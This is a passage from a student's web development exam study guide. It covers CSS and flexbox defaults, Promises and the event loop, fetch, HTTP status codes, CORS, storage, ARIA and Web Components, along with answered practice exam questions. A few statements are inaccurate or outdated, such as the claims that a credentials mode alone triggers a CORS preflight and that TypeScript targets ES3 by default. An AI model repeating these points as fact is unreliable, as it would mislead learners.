**Media query types (from slides):** `screen`, `print`, `speech`, `all`
(NOT: `mobile`, `desktop`, `tablet` — these do NOT exist)

### Promise States (Practice Exam 12)

A Promise is in one of three states:
1. **pending** — initial state
2. **fulfilled** — operation completed successfully
3. **rejected** — operation failed

A settled Promise (fulfilled OR rejected) can **never change state again**.

```javascript
// Promise executor runs SYNCHRONOUSLY
const p = new Promise((resolve, reject) => {
  console.log('X');  // prints FIRST (sync)
  resolve('Y');
  console.log('Z');  // prints SECOND (sync — resolve doesn't stop execution!)
});
p.then(val => console.log(val));  // prints FOURTH (microtask)
console.log('W');                  // prints THIRD (sync)
// Output: X, Z, W, Y
```

**`.finally()` receives NO arguments** — it runs regardless of outcome but gets no value.

### for await...of vs Promise.all

| | `Promise.all` | `for await...of` |
|---|---|---|
| Concurrency | All run at once | All start at once, results awaited sequentially |
| Timing | Resolves when SLOWEST finishes | Processes results in INPUT ORDER |
| Rejection | Short-circuits immediately | Stops at first rejection |
| Use case | Get all results together | Process results as they arrive, in order |

### BEM Deep Dive (Practice Exam 4)

**Block naming:** lowercase Latin letters, digits, and dashes (NO underscores)
**Element naming:** lowercase Latin letters, digits, dashes, and underscores
**Modifier naming:** lowercase Latin letters, digits, dashes, and underscores

Blocks use **class name selectors ONLY** — no tag names, no IDs.
Modifier is an **extra class** added to the block/element DOM node.

### CSS Variables Deep Dive (Practice Exam 4)

```javascript
// Read a CSS variable via JS
const value = getComputedStyle(element).getPropertyValue('--my-var');

// Set a CSS variable via JS
element.style.setProperty('--my-var', newValue);
```

`@property` at-rule: "Be more expressive with definition of a custom property with the ability to associate a type, set default values, and control inheritance"

Custom properties with `--` always **inherit** the value of parent. `@property` with `inherits: false` uses the `initial-value` instead of the parent's value.

### Tailwind CSS (Practice Exam 4)

- "A utility-first CSS framework"
- Conditional styles: `hover:bg-red-500`, `md:flex`, `dark:text-white`
- No context switching (write styles directly in markup)
- No naming fatigue (class names are predefined)
- Removing component removes its styles too

### TypeScript Compilation (Practice Exam 10 & 15)

Two things happen during compilation:
1. **Type annotations stripped out** — browsers can't handle TS
2. **Template literals → `concat()`** — TypeScript targets ES3 by default

`noImplicitAny`: When enabled, you MUST explicitly state `any` type; TypeScript won't allow implicit `any`.

Structural type system: TypeScript checks if an object has the required shape. Extra properties are fine; missing required properties fail.

```typescript
// This PASSES — point3d has x and y (plus extra z)
const point3d = { x: 1, y: 2, z: 3 };
logPoint(point3d); // OK

// This FAILS — animal has no x or y
const animal = { type: 'cow', name: 'Fred' };
logPoint(animal); // ERROR
```

---

## 18. Key Defaults & Must-Memorize Tables

### The Complete Defaults Table

| Property/Setting | Default Value |
|-----------------|---------------|
| `flex-direction` | `row` |
| `flex-wrap` | `nowrap` |
| `justify-content` | `flex-start` |
| `align-items` | `stretch` |
| `align-content` | `stretch` |
| `align-self` | `auto` |
| `flex-grow` | `0` (do NOT grow) |
| `flex-shrink` | `1` (do shrink) |
| `flex-basis` | `auto` |
| `order` | `0` |
| `grid-auto-flow` | `row` |
| `transform-origin` | `50% 50%` (center) |
| `perspective-origin` | `50% 50%` (center) |
| `background-repeat` | `repeat` |
| `box-sizing` | `content-box` |
| `linear-gradient direction` | `top to bottom` |
| `radial-gradient direction` | `inner to outer` |
| `useEffect with []` | runs once on mount |
| `useEffect with no array` | runs every render |
| `useRef initial value` | must pass it: `useRef(null)` |
| `react-hook-form mode` | `"onSubmit"` |
| `Next.js components` | Server Components |
| `Zustand persist storage` | `localStorage` |
| `fetch credentials` | `"same-origin"` |
| `SameSite cookie` | `Lax` (modern browsers default) |
| `tabindex default` | `-1` for non-interactive elements |
| `Promise executor` | Runs SYNCHRONOUSLY |

### HTTP Status Code Quick Reference

```
2xx Success:    200 OK, 201 Created, 204 No Content
3xx Redirect:   301 Permanent, 302 Temporary
4xx Client:     400 Bad Request, 401 Unauth, 403 Forbidden, 404 Not Found, 409 Conflict
5xx Server:     500 Internal Server Error
```

### fetch() Critical Facts

```
fetch() → resolves to Response
response.json() → resolves to data (MUST await)
response.ok → true if 200-299
404/500 → RESOLVES (not rejected!)
network error → REJECTS
```

### Promise Methods Summary

| Method | Resolves when | Rejects when |
|--------|--------------|-------------|
| `Promise.all()` | ALL resolve | ANY rejects (short-circuit) |
| `Promise.race()` | FIRST settles (resolve or reject) | FIRST rejects |
| `Promise.any()` | FIRST resolves | ALL reject (AggregateError) |
| `Promise.allSettled()` | ALL settle | Never |

Memory tricks:
- **all** = strict teacher: one failure = everyone fails
- **race** = first across the line wins (even if they trip)
- **any** = optimist: first success is enough
- **allSettled** = patient: waits for every single one

### Event Loop Execution Order

```
1. Call Stack (synchronous code)
2. ALL Microtasks (Promise .then/.catch, queueMicrotask)
3. ONE Macrotask (setTimeout, setInterval, DOM events)
4. Return to step 2
```

```javascript
console.log('1'); // sync
setTimeout(() => console.log('2'), 0); // macrotask
Promise.resolve().then(() => console.log('3')); // microtask
console.log('4'); // sync
// Output: 1, 4, 3, 2
```

### this Binding Rules

| How called | `this` = |
|-----------|---------|
| Regular call (no new) | `window` |
| `new Fn()` | New instance |
| `obj.method()` | `obj` |
| `.call(x)` or `.apply(x)` | `x` |
| `.bind(x)` | `x` (PERMANENT, can't override) |
| `setTimeout(fn)` | `window` |
| Arrow function | Lexical scope (inherits) |

---

## 19. Likely Exam Questions

These question patterns have appeared in practice exams and are likely on the final:

### Multiple Choice

1. What does `fetch()` return when it receives a 404 response?
   - **A) A resolved Promise with `response.ok === false`** ← correct
   - B) A rejected Promise
   - C) Throws an error
   - D) Returns null

2. What is the correct order of execution?
   ```javascript
   console.log('A');
   setTimeout(() => console.log('B'), 0);
   Promise.resolve().then(() => console.log('C'));
   console.log('D');
   ```
   - **A) A, D, C, B** ← correct
   - B) A, B, C, D
   - C) A, D, B, C
   - D) A, B, D, C

3. Which status code should an API return when creating a new resource successfully?
   - A) 200
   - **B) 201** ← correct
   - C) 204
   - D) 301

4. What is the difference between 401 and 403?
   - **401 = not authenticated, 403 = authenticated but not authorized**

5. Which Web Storage API stores data that persists after the browser is closed?
   - **localStorage** (sessionStorage is cleared when tab closes)

### Fill in the Blank

1. `fetch()` resolves to a ________ object. → `Response`
2. To check if a fetch was successful, check `response.________`. → `ok`
3. `response.json()` must be ________ because it returns a Promise. → `awaited`
4. The HTTP method that Server Actions use is ________. → `POST`
5. CORS preflight uses the HTTP method ________. → `OPTIONS`
6. `localStorage` stores data as ________ only. → `strings` (JSON.stringify needed for objects)
7. Custom element tag names must contain a ________. → `hyphen`
8. Web Workers communicate via ________. → `postMessage()`
9. The `dragover` event must call ________ or dropping won't work. → `preventDefault()`
10. 401 means ________, 403 means ________. → `not authenticated`, `not authorized`

### Select All That Apply

1. Which are true about Web Workers?
   - [x] Run on a separate thread
   - [x] Communicate via postMessage()
   - [x] Can make fetch() requests
   - [x] Useful for CPU-intensive tasks
   - [ ] Can access the DOM — **FALSE**
   - [ ] Share memory with main thread — **FALSE** (by default)

2. Which are true about localStorage?
   - [x] Persists after browser close
   - [x] ~5MB storage limit
   - [x] Same-origin only
   - [x] Use JSON.stringify/parse for objects
   - [ ] Sent with HTTP requests — **FALSE**
   - [ ] sessionStorage also persists — **FALSE**

3. Which are correct about CORS?
   - [x] Preflight uses OPTIONS method
   - [x] `Access-Control-Allow-Origin: *` cannot be used with credentials
   - [x] A network error (CORS block) causes fetch() to reject
   - [ ] fetch() rejects on 404 — **FALSE**
   - [ ] All requests trigger preflight — **FALSE** (only non-simple)

### Essay / Code Analysis

**Q: Identify two bugs and fix this code:**
```typescript
async function loadUserData(userId: string) {
  const response = await fetch(`/api/users/${userId}`);
  const data = response.json(); // BUG 1
  return data.name.toUpperCase();
}
```
- Bug 1: `response.json()` is not awaited — returns Promise, not data
- Bug 2: No error handling — 404 or network errors crash silently

**Q: Explain XSS and how to prevent it.**
- XSS = injecting malicious script into pages other users view
- Prevention: use `textContent` not `innerHTML`, sanitize input, CSP headers, HttpOnly cookies

**Q: What is the difference between 401 and 403?**
- 401 Unauthorized: not authenticated (no valid session/token)
- 403 Forbidden: authenticated but lacks permission for this resource

---

## 20. Cheat Sheet

### HTTP Methods (REST)

```
GET    → read      (safe, idempotent)
POST   → create    (not idempotent)
PUT    → replace   (idempotent)
PATCH  → partial   (not idempotent)
DELETE → delete    (idempotent)
```

### Status Codes (memorize)

```
200 OK | 201 Created | 204 No Content
301 Permanent | 302 Temporary
400 Bad | 401 No Auth | 403 Forbidden | 404 Not Found | 409 Conflict
500 Server Error
```

### fetch() Mental Model

```javascript
fetch(url)                     // → Promise<Response>
  .then(r => {
    if (!r.ok) throw new Error(r.status);  // 404/500 don't auto-reject!
    return r.json();           // → Promise (MUST await!)
  })
  .then(data => data)
  .catch(err => /* network error OR throw above */);
```

### CORS Preflight Trigger Checklist

- [ ] Method is PUT, DELETE, PATCH?
- [ ] Custom headers like `Authorization` or `Content-Type: application/json`?
- [ ] Credentials mode set?
→ If any YES: browser sends OPTIONS preflight first

### Storage Decision Tree

```
Need to survive browser close? → localStorage
Need to clear on tab close?    → sessionStorage
Need to send to server?        → Cookie
HttpOnly (no JS access)?       → Cookie with HttpOnly
```

### ARIA Quick Reference

```html
role="button"           → it's a button
aria-label="Close"      → accessible name (no visible text)
aria-expanded="false"   → collapsible state
aria-hidden="true"      → hide from screen readers
aria-live="polite"      → announce updates
tabindex="0"            → include in tab order
tabindex="-1"           → focusable but not in tab order
```

### Promise Resolution Cheat Sheet

```
.all()        → all resolve   OR   ANY rejects (fast-fail)
.race()       → first settles (resolve OR reject)
.any()        → first resolves OR ALL reject (AggregateError)
.allSettled() → all settle   (NEVER rejects)
```

### Event Loop Priority

```
Sync → Microtasks (ALL) → Macrotask (ONE) → Microtasks (ALL) → ...
```

### Security Quick Reference

```
XSS:  Inject JS into page. Fix: textContent, sanitize, CSP, HttpOnly
CSRF: Trick browser to make request. Fix: CSRF token, SameSite=Strict
```

### Web Components Must-Know

```javascript
customElements.define('tag-name', ClassName)  // tag MUST have hyphen
connectedCallback()    // element added to DOM
disconnectedCallback() // element removed from DOM
attributeChangedCallback(name, old, new)  // observed attribute changed
this.attachShadow({ mode: 'open' })  // encapsulated styles
```

### Web Worker Rules

```
✓ Runs on background thread
✓ communicates via postMessage()
✓ Can use fetch()
✗ NO DOM access
✗ NO direct memory sharing (by default)
```

### Drag and Drop Minimum Setup

```javascript
// MUST have: draggable="true" + dragstart + dragover + drop
element.addEventListener('dragover', e => e.preventDefault()); // REQUIRED!
```

---

*This guide covers every topic from glossary section H and all miscellaneous topics from the 15 practice exams. Topics not covered elsewhere include: JS Design Patterns, CSS Animations shorthand, Media Query types, Promise states, BEM deep dive, CSS variable JS manipulation, and TypeScript compilation details.*
